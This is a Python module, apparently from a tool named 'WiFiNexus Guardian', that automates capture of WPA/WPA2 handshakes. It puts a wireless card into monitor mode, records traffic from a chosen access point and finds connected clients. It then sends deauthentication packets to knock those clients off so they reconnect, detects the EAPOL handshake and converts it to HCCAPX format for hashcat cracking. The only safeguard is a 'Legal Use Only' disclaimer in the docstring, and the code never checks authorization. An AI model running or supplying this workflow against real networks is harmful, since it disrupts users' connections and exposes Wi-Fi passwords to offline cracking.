"""
Handshake Capturer Module - Captures WPA/WPA2 handshakes from wireless networks
Legal Use Only: Authorized security testing and network auditing
"""

import subprocess
import os
import re
import time
import platform
import signal
import threading
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from pathlib import Path


class HandshakeCapturer:
    """
    Professional WPA/WPA2 Handshake Capturer
    Captures 4-way handshakes from target networks for authorized security testing
    """
    
    def __init__(self, interface: str = None):
        self.platform = platform.system()
        self.interface = interface or self._detect_interface()
        self.original_interface = self.interface
        self.monitor_interface = None
        self.capture_process = None
        self.deauth_process = None
        self.capture_file = None
        self.handshake_detected = False
        self.target_bssid = None
        self.target_channel = None
        self.clients = []
        self.running = False
        self.capture_dir = Path("captures")
        self.capture_dir.mkdir(exist_ok=True)
        
        # Required tools
        self.required_tools = {
            'Linux': ['airmon-ng', 'airodump-ng', 'aireplay-ng', 'tcpdump'],
            'Windows': ['npcap', 'tshark'],
            'Darwin': ['airport', 'tcpdump']
        }
        
    def _detect_interface(self) -> str:
        """Detect available wireless interface"""
        if self.platform == "Linux":
            interfaces = self._get_linux_interfaces()
            return interfaces[0] if interfaces else "wlan0"
        elif self.platform == "Windows":
            return self._get_windows_interface()
        elif self.platform == "Darwin":
            return "en0"
        return "wlan0"
    
    def _get_linux_interfaces(self) -> List[str]:
        """Get list of wireless interfaces on Linux"""
        try:
            result = subprocess.run(
                ["iwconfig"],
                capture_output=True,
                text=True,
                timeout=10
            )
            interfaces = []
            for line in result.stdout.split('\n'):
                if not line.startswith(' ') and ':' in line:
                    iface = line.split(':')[0]
                    if 'IEEE' in line or 'Wireless' in line:
                        interfaces.append(iface)
            return interfaces if interfaces else ["wlan0", "wlan1"]
        except:
            return ["wlan0"]
    
    def _get_windows_interface(self) -> str:
        """Get wireless interface name on Windows"""
        try:
            result = subprocess.run(
                ["netsh", "wlan", "show", "interfaces"],
                capture_output=True,
                text=True,
                timeout=10,
                encoding='utf-8',
                errors='ignore'
            )
            for line in result.stdout.split('\n'):
                if "Name" in line and ":" in line:
                    return line.split(':', 1)[1].strip()
        except:
            pass
        return "Wi-Fi"
    
    def check_requirements(self) -> Dict[str, bool]:
        """Check if required tools are installed"""
        results = {}
        tools = self.required_tools.get(self.platform, [])
        
        for tool in tools:
            try:
                if self.platform == "Windows":
                    result = subprocess.run(
                        ["where", tool],
                        capture_output=True,
                        timeout=5
                    )
                else:
                    result = subprocess.run(
                        ["which", tool],
                        capture_output=True,
                        timeout=5
                    )
                results[tool] = result.returncode == 0
            except:
                results[tool] = False
                
        return results
    
    def enable_monitor_mode(self) -> bool:
        """Enable monitor mode on wireless interface"""
        if self.platform != "Linux":
            print(f"Monitor mode only fully supported on Linux")
            print(f"On {self.platform}, using hybrid analysis mode")
            return False
        
        try:
            # Kill interfering processes
            self._kill_interfering_processes()
            
            # Enable monitor mode using airmon-ng
            result = subprocess.run(
                ["sudo", "airmon-ng", "start", self.interface],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if result.returncode == 0:
                # Extract monitor interface name
                output = result.stdout
                match = re.search(r'monitor.*?enabled on (\w+)', output, re.IGNORECASE)
                if match:
                    self.monitor_interface = match.group(1)
                else:
                    self.monitor_interface = f"{self.interface}mon"
                
                print(f"✓ Monitor mode enabled on {self.monitor_interface}")
                return True
            else:
                # Try manual method
                return self._enable_monitor_manual()
                
        except Exception as e:
            print(f"Error enabling monitor mode: {e}")
            return False
    
    def _enable_monitor_manual(self) -> bool:
        """Manual method to enable monitor mode"""
        try:
            # Bring interface down
            subprocess.run(["sudo", "ip", "link", "set", self.interface, "down"], 
                          capture_output=True, timeout=10)
            
            # Set monitor mode
            subprocess.run(["sudo", "iw", self.interface, "set", "monitor", "control"],
                          capture_output=True, timeout=10)
            
            # Bring interface up
            subprocess.run(["sudo", "ip", "link", "set", self.interface, "up"],
                          capture_output=True, timeout=10)
            
            self.monitor_interface = self.interface
            print(f"✓ Monitor mode enabled (manual) on {self.monitor_interface}")
            return True
            
        except Exception as e:
            print(f"Manual monitor mode failed: {e}")
            return False
    
    def disable_monitor_mode(self) -> bool:
        """Disable monitor mode and restore normal operation"""
        if self.platform != "Linux" or not self.monitor_interface:
            return False
        
        try:
            subprocess.run(
                ["sudo", "airmon-ng", "stop", self.monitor_interface],
                capture_output=True,
                text=True,
                timeout=30
            )
            print(f"✓ Monitor mode disabled")
            self.monitor_interface = None
            return True
        except:
            # Try manual method
            try:
                subprocess.run(["sudo", "ip", "link", "set", self.interface, "down"],
                              capture_output=True, timeout=10)
                subprocess.run(["sudo", "iw", self.interface, "set", "type", "managed"],
                              capture_output=True, timeout=10)
                subprocess.run(["sudo", "ip", "link", "set", self.interface, "up"],
                              capture_output=True, timeout=10)
                print(f"✓ Monitor mode disabled (manual)")
                return True
            except:
                return False
    
    def _kill_interfering_processes(self):
        """Kill processes that interfere with monitor mode"""
        processes = ['NetworkManager', 'wpa_supplicant', 'dhclient']
        for proc in processes:
            try:
                subprocess.run(
                    ["sudo", "killall", proc],
                    capture_output=True,
                    timeout=5
                )
            except:
                pass
    
    def start_capture(self, target_bssid: str = None, channel: int = None, 
                     duration: int = 60) -> str:
        """
        Start packet capture for handshake detection
        
        Args:
            target_bssid: Target network BSSID (optional, captures all if None)
            channel: Channel to monitor (optional, hops if None)
            duration: Capture duration in seconds
        
        Returns:
            Capture file path
        """
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.capture_file = str(self.capture_dir / f"capture_{timestamp}.pcap")
        self.target_bssid = target_bssid
        self.target_channel = channel
        self.handshake_detected = False
        self.running = True
        
        if self.platform == "Linux":
            return self._start_capture_linux(duration)
        elif self.platform == "Windows":
            return self._start_capture_windows(duration)
        elif self.platform == "Darwin":
            return self._start_capture_macos(duration)
    
    def _start_capture_linux(self, duration: int) -> str:
        """Start capture on Linux using airodump-ng"""
        interface = self.monitor_interface or self.interface
        
        try:
            # Build airodump-ng command
            cmd = [
                "sudo", "airodump-ng",
                "-w", self.capture_file.replace('.pcap', ''),
                "--output-format", "pcap"
            ]
            
            if self.target_bssid:
                cmd.extend(["--bssid", self.target_bssid])
            
            if self.target_channel:
                cmd.extend(["-c", str(self.target_channel)])
            
            cmd.append(interface)
            
            print(f"Starting capture on {interface}...")
            print(f"Capture file: {self.capture_file}")
            
            # Start capture process
            self.capture_process = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            # Monitor for handshake in background
            threading.Thread(target=self._monitor_handshake, daemon=True).start()
            
            # Schedule stop
            def stop_after_duration():
                time.sleep(duration)
                if self.running:
                    self.stop_capture()
            
            threading.Thread(target=stop_after_duration, daemon=True).start()
            
            return self.capture_file
            
        except Exception as e:
            print(f"Capture error: {e}")
            return None
    
    def _start_capture_windows(self, duration: int) -> str:
        """Start capture on Windows using tshark/Npcap"""
        try:
            # Get interface list
            result = subprocess.run(
                ["tshark", "-D"],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            # Find wireless interface
            interface_num = "1"
            for line in result.stdout.split('\n'):
                if "Wireless" in line or "Wi-Fi" in line:
                    interface_num = line.split('.')[0].strip()
                    break
            
            cmd = [
                "tshark",
                "-i", interface_num,
                "-w", self.capture_file,
                "-f", "port 80 or port 443 or type mgt",
                "-a", f"duration:{duration}"
            ]
            
            print(f"Starting capture on Windows...")
            print(f"Capture file: {self.capture_file}")
            
            self.capture_process = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            threading.Thread(target=self._monitor_handshake_windows, daemon=True).start()
            
            return self.capture_file
            
        except Exception as e:
            print(f"Windows capture error: {e}")
            return None
    
    def _start_capture_macos(self, duration: int) -> str:
        """Start capture on macOS"""
        try:
            cmd = [
                "sudo", "tcpdump",
                "-i", self.interface,
                "-w", self.capture_file,
                "type mgt or port 80 or port 443"
            ]
            
            print(f"Starting capture on macOS...")
            
            self.capture_process = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            def stop_after_duration():
                time.sleep(duration)
                self.stop_capture()
            
            threading.Thread(target=stop_after_duration, daemon=True).start()
            
            return self.capture_file
            
        except Exception as e:
            print(f"macOS capture error: {e}")
            return None
    
    def _monitor_handshake(self):
        """Monitor capture file for handshake detection"""
        check_interval = 5
        elapsed = 0
        
        while self.running and elapsed < 300:  # Max 5 minutes
            time.sleep(check_interval)
            elapsed += check_interval
            
            if os.path.exists(self.capture_file):
                if self._check_handshake_in_file(self.capture_file):
                    print(f"\n✓✓✓ HANDSHAKE DETECTED! ✓✓✓")
                    print(f"Saved to: {self.capture_file}")
                    self.handshake_detected = True
                    
                    # Also save in HCCAPX format
                    self._convert_to_hccapx()
                    
                    # Log to database/file
                    self._log_handshake_capture()
                    
                    return
    
    def _monitor_handshake_windows(self):
        """Monitor for handshake on Windows"""
        time.sleep(10)
        if os.path.exists(self.capture_file):
            # On Windows, we analyze the pcap after capture
            print(f"\nCapture complete. Analyzing for handshakes...")
            self._analyze_pcap_for_handshake()
    
    def _check_handshake_in_file(self, filepath: str) -> bool:
        """Check if pcap file contains a valid handshake"""
        try:
            # Use tshark to detect EAPOL packets (handshake indicator)
            result = subprocess.run(
                ["tshark", "-r", filepath, "-Y", "eapol", "-T", "fields", "-e", "frame.number"],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if result.returncode == 0 and result.stdout.strip():
                eapol_count = len(result.stdout.strip().split('\n'))
                if eapol_count >= 4:  # 4-way handshake has 4 EAPOL packets
                    return True
                    
            # Alternative: use aircrack-ng to check
            result = subprocess.run(
                ["aircrack-ng", filepath],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if result.returncode == 0:
                if "KEY FOUND" in result.stdout or "handshake" in result.stdout.lower():
                    return True
                    
            return False
            
        except:
            return False
    
    def _analyze_pcap_for_handshake(self):
        """Analyze pcap file for handshakes"""
        if not os.path.exists(self.capture_file):
            return
        
        try:
            result = subprocess.run(
                ["tshark", "-r", self.capture_file, "-Y", "eapol", "-q", "-z", "eapol,stat"],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if result.stdout:
                print(f"EAPOL packets found: {result.stdout.count('EAPOL')}")
                
            # Check with aircrack-ng if available
            result = subprocess.run(
                ["aircrack-ng", self.capture_file],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if "handshake" in result.stdout.lower():
                print(f"✓ Handshake detected in capture!")
                self.handshake_detected = True
                self._convert_to_hccapx()
                
        except Exception as e:
            print(f"Analysis error: {e}")
    
    def send_deauth(self, target_bssid: str, client_mac: str = None, 
                   count: int = 10) -> bool:
        """
        Send deauthentication packets to force reconnection
        
        Args:
            target_bssid: Target access point MAC
            client_mac: Client MAC to deauth (None for broadcast)
            count: Number of deauth packets to send
        """
        if self.platform != "Linux":
            print(f"Deauthentication only supported on Linux")
            return False
        
        interface = self.monitor_interface or self.interface
        
        try:
            cmd = [
                "sudo", "aireplay-ng",
                "--deauth", str(count),
                "-a", target_bssid
            ]
            
            if client_mac:
                cmd.extend(["-c", client_mac])
            
            cmd.append(interface)
            
            print(f"Sending {count} deauth packets to {target_bssid}...")
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if result.returncode == 0:
                print(f"✓ Deauth packets sent successfully")
                return True
            else:
                print(f"Deauth failed: {result.stderr}")
                return False
                
        except Exception as e:
            print(f"Deauth error: {e}")
            return False
    
    def discover_clients(self, target_bssid: str, duration: int = 30) -> List[str]:
        """
        Discover clients connected to target network
        
        Args:
            target_bssid: Target AP MAC address
            duration: Discovery duration in seconds
        
        Returns:
            List of client MAC addresses
        """
        self.clients = []
        interface = self.monitor_interface or self.interface
        
        try:
            # Start airodump-ng to capture clients
            cmd = [
                "sudo", "airodump-ng",
                "--bssid", target_bssid,
                "--write", "/tmp/client_scan",
                "--output-format", "csv",
                interface
            ]
            
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            time.sleep(duration)
            process.terminate()
            
            # Parse CSV output
            csv_file = "/tmp/client_scan-01.csv"
            if os.path.exists(csv_file):
                with open(csv_file, 'r') as f:
                    lines = f.readlines()
                    for line in lines[1:]:  # Skip header
                        parts = line.split(',')
                        if len(parts) >= 6:
                            mac = parts[0].strip()
                            station_type = parts[1].strip()
                            if station_type != "not associated" and mac != target_bssid:
                                if mac not in self.clients:
                                    self.clients.append(mac)
            
            print(f"Discovered {len(self.clients)} clients")
            return self.clients
            
        except Exception as e:
            print(f"Client discovery error: {e}")
            return []
    
    def stop_capture(self):
        """Stop ongoing capture"""
        self.running = False
        
        if self.capture_process:
            try:
                self.capture_process.terminate()
                self.capture_process.wait(timeout=10)
                print(f"Capture stopped")
            except:
                try:
                    self.capture_process.kill()
                except:
                    pass
            finally:
                self.capture_process = None
        
        if self.deauth_process:
            try:
                self.deauth_process.terminate()
            except:
                pass
    
    def _convert_to_hccapx(self):
        """Convert pcap to HCCAPX format for hashcat"""
        if not self.capture_file or not os.path.exists(self.capture_file):
            return
        
        try:
            hccapx_file = self.capture_file.replace('.pcap', '.hccapx')
            
            # Try cap2hccapx
            result = subprocess.run(
                ["cap2hccapx", self.capture_file, hccapx_file],
                capture_output=True,
                timeout=30
            )
            
            if result.returncode == 0:
                print(f"✓ Converted to HCCAPX: {hccapx_file}")
            else:
                # Try aircrack-ng method
                result = subprocess.run(
                    ["aircrack-ng", self.capture_file, "-J", hccapx_file.replace('.hccapx', '')],
                    capture_output=True,
                    timeout=30
                )
                
                if result.returncode == 0:
                    print(f"✓ Converted using aircrack-ng")
                    
        except Exception as e:
            print(f"HCCAPX conversion error: {e}")
    
    def _log_handshake_capture(self):
        """Log handshake capture to file/database"""
        log_entry = {
            "timestamp": datetime.now().isoformat(),
            "target_bssid": self.target_bssid,
            "capture_file": self.capture_file,
            "platform": self.platform,
            "interface": self.interface
        }
        
        # Append to log file
        log_file = self.capture_dir / "handshake_log.txt"
        with open(log_file, 'a') as f:
            f.write(f"{log_entry['timestamp']} | BSSID: {log_entry['target_bssid']} | File: {log_entry['capture_file']}\n")
        
        print(f"Logged to: {log_file}")
    
    def capture_handshake_targeted(self, target_bssid: str, channel: int,
                                   timeout: int = 120) -> Optional[str]:
        """
        Complete targeted handshake capture workflow
        
        Args:
            target_bssid: Target network MAC
            channel: Network channel
            timeout: Maximum time to wait for handshake
        
        Returns:
            Path to captured handshake file or None
        """
        print(f"\n{'='*60}")
        print(f"TARGETED HANDSHAKE CAPTURE")
        print(f"{'='*60}")
        print(f"Target BSSID: {target_bssid}")
        print(f"Channel: {channel}")
        print(f"Timeout: {timeout}s")
        print(f"{'='*60}\n")
        
        # Step 1: Enable monitor mode
        if self.platform == "Linux":
            if not self.enable_monitor_mode():
                print("Failed to enable monitor mode")
                return None
        
        # Step 2: Start capture
        capture_file = self.start_capture(
            target_bssid=target_bssid,
            channel=channel,
            duration=timeout
        )
        
        if not capture_file:
            return None
        
        # Step 3: Wait for clients
        print(f"Waiting for clients...")
        time.sleep(10)
        
        # Step 4: Discover clients
        clients = self.discover_clients(target_bssid, duration=20)
        
        # Step 5: Send deauth if clients found
        if clients:
            print(f"Found {len(clients)} client(s)")
            for client in clients[:3]:  # Deauth first 3 clients
                print(f"Deauthenticating {client}...")
                self.send_deauth(target_bssid, client_mac=client, count=5)
                time.sleep(5)
                
                if self.handshake_detected:
                    break
        else:
            print("No clients found, waiting for natural handshake...")
        
        # Wait for handshake detection
        print(f"Monitoring for handshake...")
        wait_time = 0
        while wait_time < timeout and not self.handshake_detected:
            time.sleep(10)
            wait_time += 10
            print(f"Elapsed: {wait_time}s/{timeout}s")
        
        # Stop capture
        self.stop_capture()
        
        # Disable monitor mode
        if self.platform == "Linux":
            self.disable_monitor_mode()
        
        if self.handshake_detected:
            print(f"\n{'='*60}")
            print(f"SUCCESS! Handshake captured and saved")
            print(f"PCAP: {self.capture_file}")
            print(f"{'='*60}\n")
            return self.capture_file
        else:
            print(f"\nNo handshake captured within timeout")
            return None
    
    def get_capture_status(self) -> Dict:
        """Get current capture status"""
        return {
            "running": self.running,
            "interface": self.interface,
            "monitor_interface": self.monitor_interface,
            "target_bssid": self.target_bssid,
            "capture_file": self.capture_file,
            "handshake_detected": self.handshake_detected,
            "clients_found": len(self.clients),
            "platform": self.platform
        }
    
    def list_captures(self) -> List[Dict]:
        """List all captured handshake files"""
        captures = []
        
        if not self.capture_dir.exists():
            return captures
        
        for file in self.capture_dir.glob("*.pcap"):
            stat = file.stat()
            captures.append({
                "filename": file.name,
                "path": str(file),
                "size": stat.st_size,
                "created": datetime.fromtimestamp(stat.st_ctime).isoformat(),
                "has_handshake": self._check_handshake_in_file(str(file))
            })
        
        return sorted(captures, key=lambda x: x['created'], reverse=True)


if __name__ == "__main__":
    # Test handshake capturer
    print("="*60)
    print("WiFiNexus Guardian - Handshake Capturer Test")
    print("="*60)
    
    capturer = HandshakeCapturer()
    
    # Check requirements
    print("\nChecking requirements...")
    reqs = capturer.check_requirements()
    for tool, installed in reqs.items():
        status = "✓" if installed else "✗"
        print(f"  {status} {tool}")
    
    # Get status
    print(f"\nCapture Status:")
    status = capturer.get_capture_status()
    for key, value in status.items():
        print(f"  {key}: {value}")
    
    # List existing captures
    print(f"\nExisting Captures:")
    captures = capturer.list_captures()
    if captures:
        for cap in captures:
            hs = "✓ HAS HANDSHAKE" if cap['has_handshake'] else ""
            print(f"  - {cap['filename']} ({cap['size']} bytes) {hs}")
    else:
        print("  No captures found")
    
    print("\n" + "="*60)
    print("Ready for handshake capture operations")
    print("="*60)
